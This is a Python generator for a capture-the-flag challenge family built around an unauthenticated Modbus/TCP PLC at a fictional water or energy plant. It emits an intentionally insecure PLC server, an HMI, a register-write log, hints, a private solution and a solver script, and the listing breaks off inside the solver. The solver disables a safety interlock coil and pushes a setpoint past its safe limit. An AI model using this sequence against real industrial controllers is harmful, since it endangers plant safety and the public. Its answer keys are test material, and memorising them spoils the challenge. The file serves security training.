"""Deterministic renderer for the ``scada_ics_modbus_takeover`` family.

Theme: an unauthenticated Modbus/TCP-exposed PLC in a water/energy plant
(CWE-306, "Missing Authentication for Critical Function" -- the ICS protocol
auth-bypass class of advisory). A tiny stdlib-only "plc" service speaks a
minimal Modbus/TCP subset (read coils, read holding registers, write single
coil, write single register) with zero authentication, guarding a
control-logic bypass: disabling a safety interlock coil and pushing a
holding-register setpoint above its safe limit unlocks a bank of holding
registers that hold the flag. A second stdlib "hmi" service exposes a small
read-only status/notes API for recon flavor.

- ``red`` mode: the player attacks the live ``plc`` service directly.
- ``blue`` mode: the player is handed a register-write log
  (``public/evidence/register_write_log.jsonl``) and must spot the anomalous
  bypass sequence and the exfiltrated flag payload it recorded.
- ``purple`` mode: both narratives are presented together; the flag is the
  same value in every mode (either exploited live or found in the log).

Pure module: no I/O beyond the returned in-memory file mapping, no wall-clock
reads, no network. Every random choice is drawn from the injected
``random.Random`` instance, so ``render(spec, rng, cve_record)`` is a pure
function of its inputs -- same seed => byte-identical output.

Deliberately does NOT import ``families`` (which imports this module instead)
to avoid a circular import; a later phase registers this renderer there.
"""

from __future__ import annotations

import json
import random
import struct
from dataclasses import dataclass
from typing import TYPE_CHECKING

from ..models import ChallengeSpec
from ..yaml_writer import dump_yaml

if TYPE_CHECKING:
    from ..cve_source import CveRecord

# --- Family metadata (see templates/scada_ics.py module contract) -----------

FAMILY_NAME = "scada_ics_modbus_takeover"
CATEGORY = "scada_ics"
MODES: tuple[str, ...] = ("red", "blue", "purple")
DIFFICULTIES: tuple[str, ...] = ("easy", "medium", "hard")
CVE_DRIVEN = True
LLM_BRIEF = (
    "An unauthenticated Modbus/TCP PLC challenge: the player must enumerate "
    "coils and holding registers on an ICS protocol with no authentication "
    "(CWE-306), disable a safety-interlock coil, and push a setpoint register "
    "past its safe limit to unlock a control-logic bypass that exposes the "
    "flag -- attacked live (red), reconstructed from a register-write log "
    "(blue), or both (purple)."
)
COMPOSE_MARKERS: tuple[str, ...] = ("plc:", "hmi:")
SCORING_HINTS: dict = {
    "has_worker": False,
    "has_queue": False,
    "live_interaction": True,
    "decoy_density": "medium",
}
REQUIRED_FILES: tuple[str, ...] = (
    "challenge.yaml",
    "docker-compose.yml",
    "services/plc/Dockerfile",
    "services/plc/plc_server.py",
    "services/plc/requirements.txt",
    "services/hmi/Dockerfile",
    "services/hmi/hmi_app.py",
    "services/hmi/requirements.txt",
    "public/description.md",
    "public/hints.yaml",
    "public/evidence/register_write_log.jsonl",
    "private/solution.md",
    "private/solver.py",
    "private/variant.json",
    "private/checkpoints.yaml",
    "private/runtime.json",
    "tests/healthcheck.py",
)

# The Modbus PLC + HMI are not HTTP-on-8080, and health vs solve target
# different services, so validate-runtime reads this manifest instead of
# injecting --base-url. Empty args => invoke the generated solver/healthcheck
# with their own per-instance-correct defaults (PLC port / hmi-base-url).
_RUNTIME_MANIFEST = json.dumps(
    {"health": {"args": []}, "solve": {"args": []}}, indent=2
) + "\n"


# --- Variant (per-instance derived data) -------------------------------------


@dataclass(frozen=True)
class Variant:
    plant_name: str
    operator_name: str
    plc_port: int
    hmi_port: int
    unit_id: int
    interlock_coil: int
    setpoint_reg: int
    flag_reg_start: int
    flag_reg_count: int
    safe_limit: int
    malicious_setpoint: int
    engineer_subnet: str
    engineer_ip: str
    attacker_ip: str
    flag: str


def _token_hex(rng: random.Random, byte_count: int) -> str:
    return rng.getrandbits(byte_count * 8).to_bytes(byte_count, "big").hex()


def _flag_registers(flag: str) -> list[int]:
    """Pack an ASCII flag into 16-bit big-endian register values, 2 chars each."""
    data = flag.encode("ascii")
    if len(data) % 2:
        data += b"\x00"
    return [struct.unpack(">H", data[i : i + 2])[0] for i in range(0, len(data), 2)]


def _variant(rng: random.Random) -> Variant:
    plant_name = rng.choice(
        [
            "Riverbend Water Treatment",
            "Alderwood Substation",
            "Cobalt Creek Pumping Station",
            "Meridian Energy Yard",
            "Pinehollow Reservoir Control",
        ]
    )
    operator_name = rng.choice(["ops-eng-01", "hmi-operator", "shift-lead", "scada-tech"])
    plc_port = rng.randrange(5020, 5030)
    hmi_port = rng.randrange(8090, 8099)
    unit_id = rng.randrange(1, 6)

    interlock_coil = rng.randrange(0, 5)
    setpoint_reg = rng.randrange(10, 15)
    flag_reg_start = rng.randrange(40, 45)

    safe_limit = rng.randrange(60, 90) * 10  # e.g. 600..890, step 10
    malicious_setpoint = safe_limit + rng.randrange(50, 400)

    subnet_octet = rng.randrange(10, 250)
    engineer_subnet = f"10.10.{subnet_octet}.0/24"
    engineer_ip = f"10.10.{subnet_octet}.{rng.randrange(10, 250)}"
    attacker_ip = f"203.0.113.{rng.randrange(2, 254)}"

    flag = f"ctf{{modbus_bypass_{_token_hex(rng, 6)}}}"
    flag_regs = _flag_registers(flag)

    return Variant(
        plant_name=plant_name,
        operator_name=operator_name,
        plc_port=plc_port,
        hmi_port=hmi_port,
        unit_id=unit_id,
        interlock_coil=interlock_coil,
        setpoint_reg=setpoint_reg,
        flag_reg_start=flag_reg_start,
        flag_reg_count=len(flag_regs),
        safe_limit=safe_limit,
        malicious_setpoint=malicious_setpoint,
        engineer_subnet=engineer_subnet,
        engineer_ip=engineer_ip,
        attacker_ip=attacker_ip,
        flag=flag,
    )


# --- Register-write log (shared by blue-mode evidence + solver + description) --


_FLAG_REDACTED = "<redacted: recover via live control-logic bypass>"


def _log_events(rng: random.Random, v: Variant, *, reveal_flag: bool = True) -> list[dict]:
    """Build a deterministic register-write log: benign baseline + the IOC.

    Timestamps are synthetic (seed-derived offsets from a fixed epoch), never
    wall-clock, so the log is byte-identical for a fixed seed.

    ``reveal_flag`` controls whether the historian's recorded response payload
    contains the real flag. Blue/purple modes hand this log to the player as
    the intended defensive artifact, so the flag must be present for them to
    reconstruct. Red mode publishes the same log for realism but MUST redact
    the flag -- otherwise the challenge is solvable by ``grep`` with no live
    exploitation, defeating the whole point of the family.
    """
    base_minute = rng.randrange(0, 600)
    events: list[dict] = []
    t = base_minute

    def ts(minute_offset: int) -> str:
        total = base_minute + minute_offset
        hour, minute = divmod(total, 60)
        return f"2025-03-11T{(6 + hour) % 24:02d}:{minute:02d}:00Z"

    benign_registers = [reg for reg in range(10, 15) if reg != v.setpoint_reg]
    step = 0
    for i in range(rng.randrange(4, 6)):
        reg = rng.choice(benign_registers) if benign_registers else v.setpoint_reg
        value = rng.randrange(100, v.safe_limit - 20)
        events.append(
            {
                "seq": step,
                "ts": ts(step * 3),
                "src_ip": v.engineer_ip,
                "unit_id": v.unit_id,
                "session": "engineering_workstation",
                "function": "write_single_register",
                "address": reg,
                "value": value,
                "note": "routine setpoint tuning",
            }
        )
        step += 1

    # --- The IOC: an unauthenticated actor outside the engineering subnet
    # disables the safety interlock coil, then pushes the setpoint above the
    # safe limit -- the exact bypass sequence the live plc rewards.
    events.append(
        {
            "seq": step,
            "ts": ts(step * 3),
            "src_ip": v.attacker_ip,
            "unit_id": v.unit_id,
            "session": "none",
            "function": "write_single_coil",
            "address": v.interlock_coil,
            "value": 0,
            "note": "interlock coil forced OFF from outside the engineering subnet",
        }
    )
    step += 1
    events.append(
        {
            "seq": step,
            "ts": ts(step * 3),
            "src_ip": v.attacker_ip,
            "unit_id": v.unit_id,
            "session": "none",
            "function": "write_single_register",
            "address": v.setpoint_reg,
            "value": v.malicious_setpoint,
            "note": f"setpoint pushed to {v.malicious_setpoint}, above safe limit {v.safe_limit}",
        }
    )
    step += 1
    events.append(
        {
            "seq": step,
            "ts": ts(step * 3),
            "src_ip": v.attacker_ip,
            "unit_id": v.unit_id,
            "session": "none",
            "function": "read_holding_registers",
            "address": v.flag_reg_start,
            "quantity": v.flag_reg_count,
            "note": "control-logic bypass unlocked; historian recorded the response payload",
            "response_payload": v.flag if reveal_flag else _FLAG_REDACTED,
        }
    )
    step += 1
    for i in range(rng.randrange(2, 4)):
        reg = rng.choice(benign_registers) if benign_registers else v.setpoint_reg
        value = rng.randrange(100, v.safe_limit - 20)
        events.append(
            {
                "seq": step,
                "ts": ts(step * 3),
                "src_ip": v.engineer_ip,
                "unit_id": v.unit_id,
                "session": "engineering_workstation",
                "function": "write_single_register",
                "address": reg,
                "value": value,
                "note": "shift handover setpoint check",
            }
        )
        step += 1
    return events


def _evidence_log(rng: random.Random, v: Variant, *, reveal_flag: bool = True) -> str:
    events = _log_events(rng, v, reveal_flag=reveal_flag)
    lines = [json.dumps(event, sort_keys=True, separators=(",", ":")) for event in events]
    return "\n".join(lines) + "\n"


# --- render() -----------------------------------------------------------------


def render(
    spec: ChallengeSpec,
    rng: random.Random,
    cve_record: "CveRecord | None" = None,
) -> dict[str, str]:
    v = _variant(rng)
    log_rng = random.Random(rng.getrandbits(64))
    # Only blue hands the log to the player as the solvable artifact (its whole
    # task is log reconstruction). red and purple both require the live Modbus
    # exploit, so their public log is flag-redacted -- otherwise the challenge
    # is grep-solvable and the live-exploit requirement is moot.
    reveal_flag = spec.mode == "blue"
    log_text = _evidence_log(log_rng, v, reveal_flag=reveal_flag)

    files: dict[str, str] = {
        "docker-compose.yml": _compose(v),
        "services/plc/Dockerfile": _plc_dockerfile(),
        "services/plc/requirements.txt": _plc_requirements(),
        "services/plc/plc_server.py": _plc_server(v),
        "services/hmi/Dockerfile": _hmi_dockerfile(),
        "services/hmi/requirements.txt": _hmi_requirements(),
        "services/hmi/hmi_app.py": _hmi_app(v),
        "public/description.md": _description(spec, v, cve_record),
        "public/hints.yaml": _hints(spec, v),
        "public/evidence/register_write_log.jsonl": log_text,
        "private/solution.md": _solution(spec, v),
        "private/solver.py": _solver(v, spec),
        "private/variant.json": _variant_json(spec, v),
        "private/checkpoints.yaml": dump_yaml(
            {"checkpoints": [{"name": name, "required": True} for name in spec.checkpoints]}
        ),
        "private/runtime.json": _RUNTIME_MANIFEST,
        "tests/healthcheck.py": _healthcheck(v),
    }
    return files


# --- docker-compose / Dockerfiles ---------------------------------------------


def _compose(v: Variant) -> str:
    return f"""services:
  plc:
    build: ./services/plc
    environment:
      CTFGEN_FLAG: ${{CTFGEN_FLAG:-}}
    ports:
      - "{v.plc_port}:{v.plc_port}"
    networks:
      - ics
    read_only: true
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 128m
    pids_limit: 64

  hmi:
    build: ./services/hmi
    environment:
      CTFGEN_FLAG: ${{CTFGEN_FLAG:-}}
    ports:
      - "{v.hmi_port}:{v.hmi_port}"
    depends_on: [plc]
    networks:
      - ics
    security_opt:
      - no-new-privileges:true
    cap_drop: [ALL]
    mem_limit: 128m
    pids_limit: 64

networks:
  ics:
"""


def _plc_dockerfile() -> str:
    return """FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY plc_server.py .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "plc_server.py"]
"""


def _plc_requirements() -> str:
    return "# no third-party dependencies: stdlib socketserver/struct only\n"


def _hmi_dockerfile() -> str:
    return """FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY hmi_app.py .
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
CMD ["python", "hmi_app.py"]
"""


def _hmi_requirements() -> str:
    return "# no third-party dependencies: stdlib http.server only\n"


# --- plc_server.py (rendered service source) -----------------------------------

_PLC_SERVER_TEMPLATE = '''from __future__ import annotations

import os
import socketserver
import struct
import threading

# --- Modbus/TCP function codes (subset implemented here) --------------------
FUNC_READ_COILS = 0x01
FUNC_READ_HOLDING_REGISTERS = 0x03
FUNC_WRITE_SINGLE_COIL = 0x05
FUNC_WRITE_SINGLE_REGISTER = 0x06

EXC_ILLEGAL_FUNCTION = 0x01
EXC_ILLEGAL_DATA_ADDRESS = 0x02

# --- Per-instance layout (generated) -----------------------------------------
UNIT_ID = __UNIT_ID__
PLC_PORT = __PLC_PORT__
INTERLOCK_COIL = __INTERLOCK_COIL__
SETPOINT_REG = __SETPOINT_REG__
SAFE_LIMIT = __SAFE_LIMIT__
FLAG_REG_START = __FLAG_REG_START__
FLAG_REG_COUNT = __FLAG_REG_COUNT__
FLAG = os.environ.get("CTFGEN_FLAG") or "__FLAG__"
FLAG_REGISTERS = __FLAG_REGISTERS__

# NOTE (intentional vulnerability, CWE-306 -- Missing Authentication for
# Critical Function): this Modbus/TCP responder performs NO authentication
# and NO source-address filtering on any request, matching real-world
# unauthenticated PLC deployments. Any client that can reach the port can
# read and write coils/holding registers, including the safety interlock.

_lock = threading.Lock()

# address space: small coil bank + small holding-register bank, addresses
# 0..63. Everything not explicitly set defaults to 0 / False.
_coils: dict[int, bool] = {INTERLOCK_COIL: True}
_holding: dict[int, int] = {SETPOINT_REG: SAFE_LIMIT - 100}
for _i, _val in enumerate(FLAG_REGISTERS):
    _holding.setdefault(FLAG_REG_START + _i, 0x0000)  # locked until bypass


def _check_bypass() -> None:
    """Unlock condition: interlock coil OFF and setpoint above the safe limit."""
    if _coils.get(INTERLOCK_COIL, True) is False and _holding.get(SETPOINT_REG, 0) > SAFE_LIMIT:
        for _i, _val in enumerate(FLAG_REGISTERS):
            _holding[FLAG_REG_START + _i] = _val


def _read_coils(addr: int, qty: int) -> bytes:
    bits = [1 if _coils.get(addr + i, False) else 0 for i in range(qty)]
    byte_count = (qty + 7) // 8
    packed = bytearray(byte_count)
    for i, bit in enumerate(bits):
        if bit:
            packed[i // 8] |= 1 << (i % 8)
    return bytes([FUNC_READ_COILS, byte_count]) + bytes(packed)


def _read_holding_registers(addr: int, qty: int) -> bytes:
    values = [_holding.get(addr + i, 0) for i in range(qty)]
    data = b"".join(struct.pack(">H", v) for v in values)
    return bytes([FUNC_READ_HOLDING_REGISTERS, len(data)]) + data


def _exception(function: int, code: int) -> bytes:
    return bytes([function | 0x80, code])


def handle_pdu(pdu: bytes) -> bytes:
    if not pdu:
        return _exception(0x00, EXC_ILLEGAL_FUNCTION)
    function = pdu[0]
    with _lock:
        if function == FUNC_READ_COILS and len(pdu) >= 5:
            addr, qty = struct.unpack(">HH", pdu[1:5])
            if qty < 1 or qty > 64:
                return _exception(function, EXC_ILLEGAL_DATA_ADDRESS)
            return _read_coils(addr, qty)
        if function == FUNC_READ_HOLDING_REGISTERS and len(pdu) >= 5:
            addr, qty = struct.unpack(">HH", pdu[1:5])
            if qty < 1 or qty > 64:
                return _exception(function, EXC_ILLEGAL_DATA_ADDRESS)
            return _read_holding_registers(addr, qty)
        if function == FUNC_WRITE_SINGLE_COIL and len(pdu) >= 5:
            addr, raw = struct.unpack(">HH", pdu[1:5])
            _coils[addr] = raw == 0xFF00
            _check_bypass()
            return pdu[:5]
        if function == FUNC_WRITE_SINGLE_REGISTER and len(pdu) >= 5:
            addr, value = struct.unpack(">HH", pdu[1:5])
            _holding[addr] = value
            _check_bypass()
            return pdu[:5]
    return _exception(function, EXC_ILLEGAL_FUNCTION)


class ModbusHandler(socketserver.StreamRequestHandler):
    def handle(self) -> None:
        while True:
            header = self.rfile.read(7)
            if len(header) < 7:
                return
            transaction_id, protocol_id, length, unit_id = struct.unpack(">HHHB", header)
            pdu_len = max(length - 1, 0)
            pdu = self.rfile.read(pdu_len)
            if len(pdu) < pdu_len:
                return
            response_pdu = handle_pdu(pdu)
            resp_length = len(response_pdu) + 1
            resp_header = struct.pack(">HHHB", transaction_id, protocol_id, resp_length, unit_id)
            self.wfile.write(resp_header + response_pdu)
            self.wfile.flush()


class ModbusServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main() -> None:
    server = ModbusServer(("0.0.0.0", PLC_PORT), ModbusHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
'''


def _plc_server(v: Variant) -> str:
    flag_registers = _flag_registers(v.flag)
    text = _PLC_SERVER_TEMPLATE
    text = text.replace("__UNIT_ID__", str(v.unit_id))
    text = text.replace("__PLC_PORT__", str(v.plc_port))
    text = text.replace("__INTERLOCK_COIL__", str(v.interlock_coil))
    text = text.replace("__SETPOINT_REG__", str(v.setpoint_reg))
    text = text.replace("__SAFE_LIMIT__", str(v.safe_limit))
    text = text.replace("__FLAG_REG_START__", str(v.flag_reg_start))
    text = text.replace("__FLAG_REG_COUNT__", str(v.flag_reg_count))
    text = text.replace("__FLAG__", v.flag)
    text = text.replace("__FLAG_REGISTERS__", repr(flag_registers))
    return text


# --- hmi_app.py (rendered service source) --------------------------------------

_HMI_APP_TEMPLATE = '''from __future__ import annotations

import json
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HMI_PORT = __HMI_PORT__
PLC_PORT = __PLC_PORT__
UNIT_ID = __UNIT_ID__
OPERATOR = "__OPERATOR__"
PLANT_NAME = "__PLANT_NAME__"

FLAG = os.environ.get("CTFGEN_FLAG") or "__FLAG__"  # unused directly; kept for parity with other services

NOTES = [
    {
        "id": "note-1",
        "severity": "info",
        "message": (
            "__NOTE_PLANT_NAME__ Modbus/TCP interface remains on the vendor default: "
            "no authentication configured on port __NOTE_PLC_PORT__ (unit __NOTE_UNIT_ID__). "
            "Ticket filed to add TLS/auth wrapper; not yet scheduled."
        ),
    },
    {
        "id": "note-2",
        "severity": "info",
        "message": "Coil and holding-register address space is small; full enumeration is cheap.",
    },
    {
        "id": "note-3",
        "severity": "low",
        "message": "Safety interlock coils must never be left OFF unattended -- site policy, not enforced in firmware.",
    },
]


class Handler(BaseHTTPRequestHandler):
    def _json(self, status: int, payload: dict) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802 (stdlib handler name)
        if self.path == "/healthz":
            self._json(200, {"ok": True, "service": "hmi"})
            return
        if self.path == "/api/status":
            self._json(
                200,
                {
                    "plant": PLANT_NAME,
                    "plc_port": PLC_PORT,
                    "unit_id": UNIT_ID,
                },
            )
            return
        if self.path == "/api/notes":
            operator = self.headers.get("X-Operator", "")
            if operator != OPERATOR:
                self._json(401, {"error": "unknown operator"})
                return
            self._json(200, {"notes": NOTES})
            return
        self._json(404, {"error": "not found"})

    def log_message(self, format, *args):  # noqa: A002 - silence default stderr logging
        pass


def main() -> None:
    server = ThreadingHTTPServer(("0.0.0.0", HMI_PORT), Handler)
    server.serve_forever()


if __name__ == "__main__":
    main()
'''


def _hmi_app(v: Variant) -> str:
    text = _HMI_APP_TEMPLATE
    text = text.replace("__HMI_PORT__", str(v.hmi_port))
    text = text.replace("__PLC_PORT__", str(v.plc_port))
    text = text.replace("__UNIT_ID__", str(v.unit_id))
    text = text.replace("__OPERATOR__", v.operator_name)
    text = text.replace("__PLANT_NAME__", v.plant_name)
    text = text.replace("__FLAG__", v.flag)
    text = text.replace("__NOTE_PLANT_NAME__", v.plant_name)
    text = text.replace("__NOTE_PLC_PORT__", str(v.plc_port))
    text = text.replace("__NOTE_UNIT_ID__", str(v.unit_id))
    return text


# --- public/description.md -----------------------------------------------------


def _cve_blurb(cve_record: "CveRecord | None") -> str:
    if cve_record is None:
        return (
            "This scenario is modeled on the ICS protocol auth-bypass advisory "
            "class: missing authentication for a critical function (CWE-306)."
        )
    summary = cve_record.description.strip()
    if len(summary) > 220:
        summary = summary[:217].rstrip() + "..."
    return f"This scenario is modeled on **{cve_record.cve_id}**: {summary}"


def _mode_narrative(spec: ChallengeSpec, v: Variant) -> str:
    if spec.mode == "red":
        return (
            f"You have raw network access to the `{v.plant_name}` control network. "
            f"The PLC speaks Modbus/TCP on port `{v.plc_port}` (unit id `{v.unit_id}`), "
            "with no authentication. Enumerate coils and holding registers, disable "
            "the safety interlock, and push the setpoint register past its safe limit "
            "to unlock the flag registers."
        )
    if spec.mode == "blue":
        return (
            f"You are handed a register-write log recorded by the `{v.plant_name}` "
            "historian (`public/evidence/register_write_log.jsonl`). Find the "
            "anomalous write sequence -- a source outside the engineering subnet "
            f"(`{v.engineer_subnet}`) that disables the safety interlock and then "
            "pushes a setpoint past its safe limit -- and report the flag it "
            "exfiltrated."
        )
    return (
        f"Both a live PLC on `{v.plant_name}`'s network (Modbus/TCP, port "
        f"`{v.plc_port}`, unit id `{v.unit_id}`) and a register-write log "
        "(`public/evidence/register_write_log.jsonl`) are available. Reach the "
        "same flag either by exploiting the live control-logic bypass, or by "
        "spotting the anomalous write sequence in the log."
    )


def _deliverable_section(spec: ChallengeSpec, v: Variant) -> str:
    """Mode-specific "what to submit" framing -- empty for red (unchanged today)."""
    if spec.mode == "blue":
        return f"""
## Deliverable

This is a defensive challenge: no live exploitation of the `plc` service is
required or expected. Submit the flag exactly as recorded in the anomalous
`read_holding_registers` log entry's `response_payload` field, produced by a
source outside the engineering subnet (`{v.engineer_subnet}`) with
`session: none`.
"""
    if spec.mode == "purple":
        return f"""
## Deliverable

Reach the flag via either path (or both): the live control-logic bypass, or
the anomalous entry in the register-write log. Whichever path you take,
identify the anomalous source IP outside the engineering subnet
(`{v.engineer_subnet}`) and note it alongside the flag -- a purple-mode
submission should show both how the bypass was reached and how a defender
would have detected it in the log.
"""
    return ""


def _description(spec: ChallengeSpec, v: Variant, cve_record: "CveRecord | None") -> str:
    return f"""# {spec.title}

{_cve_blurb(cve_record)}

{_mode_narrative(spec, v)}

## Recon

- `GET http://<host>:{v.hmi_port}/api/status` -- plant/unit metadata (no auth required).
- `GET http://<host>:{v.hmi_port}/api/notes` with header `X-Operator: {v.operator_name}` -- maintenance
  notes calling out the missing Modbus authentication.
- Modbus/TCP on port `{v.plc_port}`, unit id `{v.unit_id}`: function code `0x01` (read
  coils), `0x03` (read holding registers), `0x05` (write single coil), `0x06`
  (write single register). No login, no source-address filtering.

The safety interlock coil address and the setpoint register address are not
handed to you directly -- enumerate the small coil/holding-register address
space (0-63) to find them.

The flag format is `ctf{{...}}`. This challenge is generated with per-instance
ports, register addresses, safe limits, and network identities; the exact
values may differ across generated instances.
{_deliverable_section(spec, v)}"""


# --- public/hints.yaml -----------------------------------------------------------


def _hints(spec: ChallengeSpec, v: Variant) -> str:
    hints = [
        {
            "level": 1,
            "text": f"The Modbus/TCP service on port {v.plc_port} performs no authentication -- read before you write.",
        },
        {
            "level": 2,
            "text": "Enumerate coils (function 0x01) and holding registers (function 0x03) across a small address range to find the interlock and setpoint.",
        },
        {
            "level": 3,
            "text": "Disabling the interlock alone is not enough -- the setpoint register must also exceed its safe limit before anything unlocks.",
        },
    ]
    if spec.mode in ("blue", "purple"):
        hints.append(
            {
                "level": 4,
                "text": f"In the log, filter for writes whose src_ip falls outside {v.engineer_subnet} -- that is the anomalous sequence.",
            }
        )
    return dump_yaml({"hints": hints})


# --- private/solution.md --------------------------------------------------------


def _solution_vuln_section(v: Variant) -> str:
    return f"""# Private Solution

## Vulnerability

The `plc` service implements Modbus/TCP function codes 0x01/0x03/0x05/0x06 with
**no authentication and no source filtering** (CWE-306). Holding register
`{v.setpoint_reg}` is a control setpoint bounded by a safe limit of
`{v.safe_limit}`; coil `{v.interlock_coil}` is the safety interlock. Holding
registers `{v.flag_reg_start}..{v.flag_reg_start + v.flag_reg_count - 1}` are
zeroed until the bypass condition fires: interlock coil OFF **and** setpoint
register value greater than `{v.safe_limit}`.

"""


def _solution_live_section(v: Variant) -> str:
    flag_regs = _flag_registers(v.flag)
    return f"""## Live exploit path (red / purple)

1. Read coils `0..15` (function 0x01) and holding registers `0..63` (function
   0x03) to find the interlock coil `{v.interlock_coil}` and setpoint register
   `{v.setpoint_reg}`.
2. Write single coil {v.interlock_coil} = OFF (function 0x05, value `0x0000`).
3. Write single register {v.setpoint_reg} = `{v.malicious_setpoint}` (function
   0x06, greater than the safe limit `{v.safe_limit}`).
4. Read holding registers starting at `{v.flag_reg_start}`, quantity
   `{v.flag_reg_count}` (function 0x03). Decode each 16-bit register as two
   ASCII bytes, big-endian, and concatenate: registers `{flag_regs}` decode to
   the flag.

"""


def _solution_log_section(v: Variant) -> str:
    return f"""## Log analysis path (blue / purple)

In `public/evidence/register_write_log.jsonl`, baseline writes originate from
`{v.engineer_ip}` (inside `{v.engineer_subnet}`, `session: engineering_workstation`).
The anomalous sequence originates from `{v.attacker_ip}` (`session: none`):

1. `write_single_coil` on address `{v.interlock_coil}`, value `0` (interlock
   forced off).
2. `write_single_register` on address `{v.setpoint_reg}`, value
   `{v.malicious_setpoint}` (above the safe limit `{v.safe_limit}`).
3. `read_holding_registers` starting at `{v.flag_reg_start}` -- the historian
   recorded the response payload directly: `response_payload` on that event
   is the flag.

"""


def _solution_flag_section(v: Variant) -> str:
    return f"""## Flag

```
{v.flag}
```
"""


def _solution_blue_response_section(v: Variant) -> str:
    """Blue-only deliverable: no offensive steps -- an incident-response writeup."""
    return f"""## Indicators of compromise

| field | value |
| --- | --- |
| anomalous source IP | `{v.attacker_ip}` |
| expected engineering subnet | `{v.engineer_subnet}` |
| forced-off interlock coil | `{v.interlock_coil}` |
| setpoint register pushed out of range | `{v.setpoint_reg}` (value `{v.malicious_setpoint}` > safe limit `{v.safe_limit}`) |
| exfiltration channel | `read_holding_registers` at `{v.flag_reg_start}`, response payload recorded verbatim by the historian |

## Recommended remediation

1. Block Modbus/TCP writes to `{v.plant_name}`'s PLC from any address outside
   `{v.engineer_subnet}` at the network layer -- the protocol itself has no
   authentication to enforce this.
2. Add an interlock-state alarm: any `write_single_coil` on address
   `{v.interlock_coil}` that clears the interlock outside a maintenance window
   should page on-call staff immediately.
3. Add a setpoint bounds check independent of the PLC logic (e.g. in the
   historian or a network-layer Modbus proxy) that rejects
   `write_single_register` values on `{v.setpoint_reg}` above `{v.safe_limit}`.

## Deliverable

The incident-response submission is the flag recorded verbatim in the
anomalous `read_holding_registers` log entry's `response_payload` field --
no live exploitation of the `plc` service is required or expected in this
mode.

"""


def _solution_purple_correlation_section(v: Variant) -> str:
    """Purple-only addendum: ties the live exploit to the detection signature."""
    return f"""## Detection & response guidance (purple)

The write sequence in step 2-3 above is exactly the anomaly a defender should
flag in `public/evidence/register_write_log.jsonl`: a `session: none` source
outside `{v.engineer_subnet}` writing coil `{v.interlock_coil}` OFF followed by
a `{v.setpoint_reg}` write above `{v.safe_limit}`. A complete purple-mode
answer correlates the live bypass with that log signature and recommends the
same remediation as the blue-only deliverable: source-address filtering on
Modbus writes, an interlock-state alarm, and an independent setpoint bounds
check on `{v.setpoint_reg}`.

"""


def _solution(spec: ChallengeSpec, v: Variant) -> str:
    vuln = _solution_vuln_section(v)
    live = _solution_live_section(v)
    log = _solution_log_section(v)
    flag_section = _solution_flag_section(v)

    if spec.mode == "blue":
        # No offensive/live-exploit section: a defensive deliverable only.
        return vuln + log + _solution_blue_response_section(v) + flag_section
    if spec.mode == "purple":
        return vuln + live + log + _solution_purple_correlation_section(v) + flag_section
    # red (and any unrecognized mode): unchanged from the original, byte-identical
    # combined write-up that already passes real-Docker validation.
    return vuln + live + log + flag_section


# --- private/solver.py -----------------------------------------------------------


_SOLVER_TEMPLATE = '''from __future__ import annotations

import argparse
import json
import socket
import struct
import sys
from pathlib import Path

# Generated per-instance layout.
PLC_PORT = __PLC_PORT__
UNIT_ID = __UNIT_ID__
INTERLOCK_COIL = __INTERLOCK_COIL__
SETPOINT_REG = __SETPOINT_REG__
SAFE_LIMIT = __SAFE_LIMIT__
MALICIOUS_SETPOINT = __MALICIOUS_SETPOINT__
FLAG_REG_START = __FLAG_REG_START__
FLAG_REG_COUNT = __FLAG_REG_COUNT__
ENGINEER_SUBNET_PREFIX = "__ENGINEER_SUBNET_PREFIX__"

FUNC_READ_HOLDING_REGISTERS = 0x03
FUNC_WRITE_SINGLE_COIL = 0x05
FUNC_WRITE_SINGLE_REGISTER = 0x06


class ModbusClient:
    """Minimal Modbus/TCP client: enough function codes to solve this challenge."""

    def __init__(self, host: str, port: int, unit_id: int):
        self._sock = socket.create_connection((host, port), timeout=5)
        self._unit_id = unit_id
        self._transaction_id = 0

    def _request(self, pdu: bytes) -> bytes:
        self._transaction_id = (self._transaction_id + 1) & 0xFFFF
        header = struct.pack(">HHHB", self._transaction_id, 0, len(pdu) + 1, self._unit_id)
        self._sock.sendall(header + pdu)
        resp_header = self._sock.recv(7)
        _, _, length, _ = struct.unpack(">HHHB", resp_header)
        return self._sock.recv(length - 1)

    def write_single_coil(self, address: int, value: bool) -> None:
        raw = 0xFF00 if value else 0x0000
        self._request(struct.pack(">BHH", FUNC_WRITE_SINGLE_COIL, address, raw))

    def write_single_register(self, address: int, value: int) -> None:
        self._request(struct.pack(">BHH", FUNC_WRITE_SINGLE_REGISTER, address, value))

    def read_holding_registers(self, address: int, quantity: int) -> list[int]:
        resp = self._request(struct.pack(">BHH", FUNC_READ_HOLDING_REGISTERS, address, quantity))
        byte_count = resp[1]
        data = resp[2 : 2 + byte_count]
        return [struct.unpack(">H", data[i : i + 2])[0] for i in range(0, len(data), 2)]


def registers_to_flag(values: list[int]) -> str:
    data = b"".join(struct.pack(">H", v) for v in values)
    return data.rstrip(b"\\x00").decode("ascii", errors="replace")


def solve_live(host: str) -> str:
    client = ModbusClient(host, PLC_PORT, UNIT_ID)
    client.write_single_coil(INTERLOCK_COIL, False)
    client.write_single_register(SETPOINT_REG, MALICIOUS_SETPOINT)
    values = client.read_holding_registers(FLAG_REG_START, FLAG_REG_COUNT)
    return registers_to_flag(values)


def solve_from_log(log_path: Path) -> str:
    for line in log_path.read_text(encoding="utf-8").splitlines():
        if not line.strip():
            continue
        event = json.loads(line)
        if event.get("session") == "none" and event.get("src_ip", "").startswith("__ATTACKER_PREFIX__"):
            payload = event.get("response_payload")
            if payload:
                return payload
    raise RuntimeError("anomalous read-with-payload event not found in log")


def main() -> int:
